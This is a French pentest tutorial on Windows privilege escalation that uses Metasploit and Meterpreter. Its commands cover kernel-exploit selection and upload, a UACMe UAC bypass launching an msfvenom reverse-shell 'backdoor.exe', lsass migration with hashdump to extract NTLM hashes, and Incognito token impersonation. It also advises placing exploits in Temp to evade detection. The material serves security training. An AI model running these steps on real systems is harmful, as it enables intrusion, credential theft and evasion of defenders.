# Windows Privilege Escalation

L’**escalade de privilèges** est le processus consistant à exploiter des vulnérabilités ou des mauvaises configurations afin d’élever l’accès d’un utilisateur peu privilégié vers un utilisateur plus privilégié — généralement `SYSTEM` ou l’Administrateur local. C’est une phase critique du cycle d’attaque et un facteur majeur de réussite d’un test d’intrusion.

> ⚠️ **Note** : Toutes les commandes supposent que vous opérez depuis une machine d’attaque **Kali Linux** avec une session Meterpreter active sur la cible. Remplacez les IP et chemins de fichiers par vos valeurs réelles.

***

## Le noyau Windows

Le **noyau** est le cœur du système d’exploitation — il a un contrôle total sur chaque ressource et composant matériel du système. Il agit comme une couche de traduction entre le matériel et les logiciels.

**Windows NT** est le noyau pré-packagé avec toutes les versions modernes de Windows. Il fonctionne avec deux modes principaux :

| Mode | Niveau d’accès | Description |
|------|----------------|-------------|
| **User Mode** | Limité | Les programmes et services s’exécutent ici avec un accès restreint aux ressources système |
| **Kernel Mode** | Illimité | Accès complet aux ressources système, au matériel, aux périphériques et à la mémoire |

Le code exécuté en **Kernel Mode** tourne avec le niveau de privilèges le plus élevé (`SYSTEM`). Les exploits de noyau ciblent des vulnérabilités dans le noyau Windows pour exécuter du code arbitraire à ce niveau.

> ⚠️ **Attention** : Les exploits de noyau peuvent provoquer des **crashs système et des pertes de données**. À éviter en environnement de production/entreprise sauf nécessité absolue.

***

## Méthodologie d’escalade de privilèges

```
Obtenir un accès initial → Énumérer le système → Identifier les vulnérabilités du noyau → Exploiter → Shell SYSTEM
```

### Étape 1 : Énumérer le système

Une fois que vous avez une session Meterpreter avec peu de privilèges :

```bash
meterpreter > sysinfo
meterpreter > getuid
meterpreter > getprivs
```

Copiez la sortie de `sysinfo` dans un fichier texte sur Kali — vous en aurez besoin pour Windows-Exploit-Suggester.

### Étape 2 : Tenter l’escalade automatique de privilèges

```bash
meterpreter > getsystem
```

`getsystem` tente plusieurs techniques intégrées pour élever automatiquement les privilèges. Si cela réussit, vous avez désormais `SYSTEM`. Si cela échoue, continuez manuellement.

### Étape 3 : Utiliser local_exploit_suggester (Metasploit)

Mettez votre session en arrière-plan et lancez le module post-exploitation :

```bash
meterpreter > background
msf6 > use post/multi/recon/local_exploit_suggester
msf6 > set SESSION <session_id>
msf6 > run
```

Cela énumère toutes les vulnérabilités spécifiques à la version de Windows et liste les modules d’exploit Metasploit susceptibles de fonctionner.

***

## Exploitation du noyau avec Windows-Exploit-Suggester

**Windows-Exploit-Suggester** compare le niveau de patch de la cible avec la base de données de vulnérabilités Microsoft pour détecter les correctifs manquants et les exploits publics disponibles.

> GitHub : [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

### Étape 1 : Installer et mettre à jour la base

```bash
# Sur Kali
pip install xlrd
./windows-exploit-suggester.py --update
# Génère un fichier .xlsx daté, par ex. 2024-01-01-mssb.xlsx
```

### Étape 2 : Récupérer les infos système de la cible

```bash
meterpreter > sysinfo
# Copiez la sortie complète vers un fichier sur Kali
```

```bash
# Sur Kali — enregistrer la sortie sysinfo
echo "<collez la sortie de sysinfo ici>" > systeminfo.txt
```

### Étape 3 : Lancer Windows-Exploit-Suggester

```bash
./windows-exploit-suggester.py --database 2024-01-01-mssb.xlsx --systeminfo systeminfo.txt
```

L’outil liste les vulnérabilités pour lesquelles le système n’a pas de correctif, ainsi que les exploits disponibles. Les résultats sont classés — les **premières entrées sont généralement les plus fiables**.

### Étape 4 : Télécharger et transférer l’exploit

Exemple avec **MS16-135** :

```bash
# Sur Kali — télécharger le binaire d’exploit compilé
# Transférer vers la cible via Meterpreter
meterpreter > upload /root/MS16-135.exe C:\\Users\\admin\\AppData\\Local\\Temp\\MS16-135.exe
meterpreter > shell
C:\> C:\Users\admin\AppData\Local\Temp\MS16-135.exe
```

> **Toujours uploader dans le répertoire Temp** — il est moins surveillé et moins susceptible d’être remarqué par l’utilisateur ou les outils de sécurité.

> Collection d’exploits de noyau Windows triés par CVE : [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

***

## Contournement de l’UAC avec UACMe

### Qu’est-ce que l’UAC ?

L’**UAC (User Account Control)** est une fonctionnalité de sécurité Windows introduite avec Vista qui empêche les modifications non autorisées du système. Lorsqu’un programme nécessite des privilèges élevés :

| Type d’utilisateur | Comportement UAC |
|--------------------|------------------|
| **Utilisateur non privilégié** | Demande les **identifiants administrateur** |
| **Administrateur local** | Demande un **consentement** (Oui/Non) |

L’UAC possède des niveaux d’intégrité allant de **Low → Medium → High → System**. Si le niveau de protection UAC est réglé **en dessous de High**, des programmes peuvent être exécutés avec des privilèges élevés sans inviter l’utilisateur.

### Qu’est-ce que UACMe ?

**UACMe** est un outil open source d’escalade de privilèges qui contourne l’UAC sur Windows 7 à 10. Il abuse du mécanisme intégré **AutoElevate** de Windows — une fonctionnalité qui permet à certains binaires Windows de confiance de s’auto-élever sans invite UAC.

> GitHub : [https://github.com/hfiref0x/UACME](https://github.com/hfiref0x/UACME)

UACMe contient **plus de 60 méthodes** (clés), chacune ciblant un binaire ou une technique Windows différente. La clé que vous utilisez dépend de la **version de Windows** de la cible.

### Référence des clés UACMe

| Clé | Méthode | Version de Windows |
|-----|---------|--------------------|
| **23** | `autoelevate` via `sysprep.exe` | Windows 7, 8, 8.1, 10 |
| **24** | `autoelevate` via `MMC` | Windows 7, 8, 8.1, 10 |
| **30** | `autoelevate` via `IFileOperation` | Windows 7, 8, 8.1 |
| **41** | `autoelevate` via `sfc.exe` | Windows 7, 8, 8.1, 10 |
| **43** | `autoelevate` via `APPINFO` | Windows 10 |
| **61** | `autoelevate` via logger `WOW64` | Windows 10 |

> La clé **23** (`sysprep.exe`) est la plus couramment utilisée en lab — elle fonctionne sur Windows 7, 8, 8.1 et 10.

### Syntaxe d’utilisation

```bash
Akagi32.exe <clé> <chemin_complet_vers_le_payload>
Akagi64.exe <clé> <chemin_complet_vers_le_payload>
```

Utilisez `Akagi32.exe` pour les cibles 32 bits et `Akagi64.exe` pour les cibles 64 bits.

***

### Workflow complet de contournement UAC

#### Étape 1 : Obtenir une session Meterpreter initiale

```bash
msfconsole
msf6 > use exploit/windows/http/rejetto_hfs_exec
msf6 > set RHOSTS 10.10.10.10
msf6 > set LHOST <votre_ip>
msf6 > exploit
```

Confirmez que vous êtes dans le groupe des administrateurs locaux mais sans privilèges élevés :

```bash
meterpreter > getuid
meterpreter > getsystem   # Va échouer — l’UAC bloque l’élévation
```

#### Étape 2 : Migrer vers un processus stable

```bash
meterpreter > pgrep explorer
meterpreter > migrate <explorer_pid>
```

Migrer vers `explorer.exe` vous donne une session plus stable, s’exécutant dans le contexte de l’utilisateur.

#### Étape 3 : Générer un payload malveillant

Sur Kali :

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=<votre_ip> \
  LPORT=1234 \
  -f exe > backdoor.exe
```

#### Étape 4 : Uploader UACMe et le payload sur la cible

```bash
meterpreter > cd C:\\Users\\admin\\AppData\\Local\\Temp
meterpreter > upload /root/Desktop/tools/UACME/Akagi64.exe
meterpreter > upload /root/backdoor.exe
```

#### Étape 5 : Configurer un listener sur Kali

```bash
msfconsole
msf6 > use multi/handler
msf6 > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 > set LHOST <votre_ip>
msf6 > set LPORT 1234
msf6 > exploit -j
```

#### Étape 6 : Exécuter le contournement UAC

Revenez à la session Meterpreter initiale et passez en shell :

```bash
meterpreter > shell
C:\Users\admin\AppData\Local\Temp> Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
```

La clé `23` déclenche l’AutoElevate de `sysprep.exe` — elle lance `backdoor.exe` avec des privilèges élevés, en contournant totalement l’invite UAC.

#### Étape 7 : Dumper les hashes à partir de la session élevée

Sur la nouvelle session Meterpreter élevée :

```bash
meterpreter > pgrep lsass
meterpreter > migrate <lsass_pid>
meterpreter > hashdump
```

Migrer vers `lsass.exe` (Local Security Authority Subsystem Service) est nécessaire car il gère toutes les informations d’authentification — y migrer vous donne la possibilité d’extraire les hashes NTLM de tous les utilisateurs.

***

## Usurpation de jetons d’accès

### Que sont les jetons d’accès Windows ?

Les **jetons d’accès** sont créés par `winlogon.exe` chaque fois qu’un utilisateur s’authentifie. Ils décrivent le **contexte de sécurité** (identité + privilèges) d’un processus ou d’un thread. Tous les processus enfants héritent d’une copie du jeton du parent.

Les jetons sont gérés par **LSASS (Local Security Authority Subsystem Service)**.

### Types de jetons

| Type de jeton | Créé par | Peut usurper sur |
|---------------|----------|------------------|
| **Impersonate-level** | Connexion non interactive (services, logons de domaine) | Système local uniquement |
| **Delegate-level** | Connexion interactive (console, RDP) | N’importe quel système — **menace maximale** |

Les jetons de niveau delegate sont les plus dangereux car ils peuvent être utilisés pour usurper les utilisateurs sur l’ensemble du réseau.

### Privilèges requis

Pour réaliser une usurpation de jeton, vous devez disposer d’au moins l’un des privilèges suivants :

| Privilège | Description |
|-----------|-------------|
| **SeAssignPrimaryToken** | Permet d’usurper des jetons |
| **SeCreateToken** | Permet de créer des jetons arbitraires avec des privilèges administrateur |
| **SeImpersonatePrivilege** | Permet de créer un processus sous le contexte de sécurité d’un autre utilisateur — **le plus courant** |

Vérifiez vos privilèges actuels :

```bash
meterpreter > getprivs
```

Cherchez `SeImpersonatePrivilege` dans la sortie.

### Usurpation de jetons avec Incognito (Metasploit)

**Incognito** est un module Metasploit qui liste et usurpe les jetons d’accès disponibles après exploitation réussie.

#### Étape 1 : Charger Incognito

```bash
meterpreter > load incognito
```

#### Étape 2 : Lister les jetons disponibles

```bash
meterpreter > list_tokens -u
```

La sortie montre deux catégories :
- **Delegation Tokens** — connexions interactives (les plus utiles)
- **Impersonation Tokens** — connexions non interactives

#### Étape 3 : Usurper un jeton

```bash
meterpreter > impersonate_token "DOMAIN\\Administrator"
```

Utilisez le nom de jeton exact montré dans la sortie `list_tokens`, avec double anti-slash.

#### Étape 4 : Vérifier l’élévation

```bash
meterpreter > getuid
meterpreter > migrate <explorer_pid>
```

Migrer vers `explorer.exe` après l’usurpation stabilise la session élevée.

> **Si aucun jeton utile n’est disponible** : utilisez l’**attaque Potato** (Juicy Potato, Rotten Potato) — une technique qui force la création de jetons privilégiés en abusant des interactions de services Windows. Traitée dans une leçon séparée.

***

## Résumé des techniques d’escalade de privilèges

| Technique | Outil | Prérequis | Résultat |
|----------|------|-----------|----------|
| **Auto-escalade** | `getsystem` | Session Meterpreter peu privilégiée | SYSTEM (si non patché) |
| **Exploit de noyau** | Windows-Exploit-Suggester + binaire d’exploit | Correctifs manquants | SYSTEM |
| **Contournement UAC** | UACMe (Akagi) | Appartenance au groupe Administrateurs locaux | Administrateur élevé |
| **Usurpation de jeton** | Incognito (MSF) | `SeImpersonatePrivilege` | Administrateur / SYSTEM |
| **Local exploit suggester** | Module post MSF | Session Meterpreter active | Liste tous les exploits possibles |

***

## Points clés à retenir

- L’**escalade de privilèges** élève l’accès d’un utilisateur peu privilégié vers `Administrator` ou `SYSTEM`.
- **Windows NT** fonctionne en User Mode (restreint) et Kernel Mode (illimité). Les exploits de noyau exécutent du code au niveau de privilèges maximal.
- **`getsystem`** tente une escalade automatique — essayez-le en premier. En cas d’échec, passez aux méthodes manuelles.
- **`local_exploit_suggester`** énumère tous les modules d’exploit Metasploit pertinents pour la version de Windows ciblée.
- **Windows-Exploit-Suggester** compare le niveau de patch de la cible à la base de données de vulnérabilités Microsoft — et retourne une liste de correctifs manquants classés avec exploits disponibles.
- **Uploader toujours les fichiers d’exploit dans `C:\Users\<user>\AppData\Local\Temp`** — c’est un emplacement moins surveillé, moins susceptible d’être détecté.
- L’**UAC** empêche les élévations de privilèges non autorisées. UACMe le contourne en abusant des binaires de confiance AutoElevate de Windows.
- La **clé 23 de UACMe** (`sysprep.exe`) fonctionne sur Windows 7/8/8.1/10 et est la plus utilisée en environnement de lab.
- Les **jetons d’accès** définissent le contexte de sécurité des processus. Les jetons de niveau delegate (issus de connexions interactives) sont les plus puissants — ils fonctionnent sur tout le réseau.
- **`SeImpersonatePrivilege`** est le privilège clé requis pour les attaques d’usurpation de jetons.
- **Incognito** liste et usurpe les jetons disponibles. Migrez vers `explorer.exe` après l’usurpation pour stabiliser la session.
- Migrez vers **`lsass.exe`** avant d’exécuter `hashdump` pour extraire les hashes NTLM de tous les utilisateurs.
